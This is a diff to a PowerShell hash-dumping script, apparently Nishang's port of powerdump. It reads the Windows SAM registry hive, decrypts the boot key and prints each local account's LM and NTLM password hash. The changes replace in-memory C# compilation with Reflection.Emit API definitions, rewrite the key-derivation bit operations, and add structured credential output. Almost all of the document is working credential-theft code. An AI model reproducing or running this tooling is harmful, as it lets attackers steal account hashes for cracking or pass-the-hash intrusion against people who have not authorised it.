@@ -16,97 +16,111 @@ https://github.com/samratashok/nishang
 
 #> 
 [CmdletBinding()]
-Param ()
+Param (
+    [Switch]$StringFormat
+)
 
-
-#######################################powerdump written by David Kennedy#########################################
+$script:PowerDump = $null
 function LoadApi
 {
-    $oldErrorAction = $global:ErrorActionPreference;
-    $global:ErrorActionPreference = "SilentlyContinue";
-    $test = [PowerDump.Native];
-    $global:ErrorActionPreference = $oldErrorAction;
-    if ($test)
-    {
-        # already loaded
-        return;
-     }
+    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
+    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
+    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')
 
-$code = @'
-using System;
-using System.Security.Cryptography;
-using System.Runtime.InteropServices;
-using System.Text;
+    #######################################################################
+    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegOpenKeyEx',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
+    )
 
-namespace PowerDump
-{
-    public class Native
-    {
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
-     public static extern int RegOpenKeyEx(
-        int hKey,
-        string subKey,
-        int ulOptions,
-        int samDesired,
-        out int hkResult);
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
 
-    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
-    extern public static int RegEnumKeyEx(
-        int hkey,
-        int index,
-        StringBuilder lpName,
-        ref int lpcbName,
-        int reserved,
-        StringBuilder lpClass,
-        ref int lpcbClass,
-        out long lpftLastWriteTime);
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegOpenKeyEx',
+        [Runtime.InteropServices.CharSet]::Auto
+    )
 
-    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
-    extern public static int RegQueryInfoKey(
-        int hkey,
-        StringBuilder lpClass,
-        ref int lpcbClass,
-        int lpReserved,
-        out int lpcSubKeys,
-        out int lpcbMaxSubKeyLen,
-        out int lpcbMaxClassLen,
-        out int lpcValues,
-        out int lpcbMaxValueNameLen,
-        out int lpcbMaxValueLen,
-        out int lpcbSecurityDescriptor,
-        IntPtr lpftLastWriteTime);
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ##########################################################################
+    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
+    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegQueryInfoKey',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
+    )
 
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern int RegCloseKey(
-        int hKey);
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
 
-        }
-    } // end namespace PowerDump
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegQueryInfoKey',
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        $true
+    )
 
-    public class Shift {
-        public static int   Right(int x,   int count) { return x >> count; }
-        public static uint  Right(uint x,  int count) { return x >> count; }
-        public static long  Right(long x,  int count) { return x >> count; }
-        public static ulong Right(ulong x, int count) { return x >> count; }
-        public static int    Left(int x,   int count) { return x << count; }
-        public static uint   Left(uint x,  int count) { return x << count; }
-        public static long   Left(long x,  int count) { return x << count; }
-        public static ulong  Left(ulong x, int count) { return x << count; }
-    }
-'@
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ###############################################################################
+    #[DllImport("advapi32.dll", SetLastError=true)]
+    #public static extern int RegCloseKey(int hKey);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegCloseKey',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int])
+    )
 
-   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
-   $dllName = [PsObject].Assembly.Location
-   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
-   $assemblies = @("System.dll", $dllName)
-   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
-   $compilerParameters.GenerateInMemory = $true
-   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
-   if($compilerResults.Errors.Count -gt 0) {
-     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
-   }
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
 
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegCloseKey',
+        $true
+    )
+
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ################################################################################
+    
+    $script:PowerDump = $TypeBuilder.CreateType()
 }
+
+#######################################powerdump written by David Kennedy#########################################
 
 $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
 $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
@@ -133,36 +147,35 @@ $odd_parity = @(
 
 function sid_to_key($sid)
 {
-    $s1 = @();
-    $s1 += [char]($sid -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
-    $s1 += $s1[0];
-    $s1 += $s1[1];
-    $s1 += $s1[2];
-    $s2 = @();
-    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
-    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
-    return ,((str_to_key $s1),(str_to_key $s2));
+    $c0 = $sid -band 255
+    $c1 = ($sid -band 65280)/256
+    $c2 = ($sid -band 16711680)/65536
+    $c3 = ($sid -band 4278190080)/16777216
+
+    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
+    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 
+
+    return ,((str_to_key $s1),(str_to_key $s2))
 }
 
 function str_to_key($s)
 {
-    $key = @();
-    $key += [Shift]::Right([int]($s[0]), 1 );
-    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
-    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
-    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
-    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
-    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
-    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
-    $key += $([int]($s[6]) -band 0x7F);
+    $k0 = [int][math]::Floor($s[0] * 0.5)
+    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
+    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
+    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
+    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
+    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
+    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
+    $k7 = $($s[6] -band 0x7F)
+
+    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)
+
     0..7 | %{
-        $key[$_] = [Shift]::Left($key[$_], 1);
-        $key[$_] = $odd_parity[$key[$_]];
-        }
-    return ,$key;
+        $key[$_] = $odd_parity[($key[$_] * 2)]
+    }
+
+    return ,$key
 }
 
 function NewRC4([byte[]]$key)
@@ -238,11 +251,11 @@ function Get-RegKeyClass([string]$key, [string]$subkey)
     $KEYALLACCESS = 0x3F;
     $result = "";
     [int]$hkey=0
-    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
+    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
     {
     	$classVal = New-Object Text.Stringbuilder 1024
     	[int]$len = 1024
-    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
+    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
     		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
     	{
     		$result = $classVal.ToString()
@@ -251,7 +264,7 @@ function Get-RegKeyClass([string]$key, [string]$subkey)
     	{
     		Write-Error "RegQueryInfoKey failed";
     	}
-    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
+    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
     }
     else
     {
@@ -374,9 +387,18 @@ function DumpHashes
     $hbootKey = Get-HBootKey $bootkey;
     Get-UserKeys | %{
         $hashes = Get-UserHashes $_ $hBootKey;
+        if($StringFormat){
         "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
             [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
             [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
+        }else{
+            $creds = New-Object psobject
+            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
+            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
+            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
+            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
+            $creds
+        }
     }
 }
 
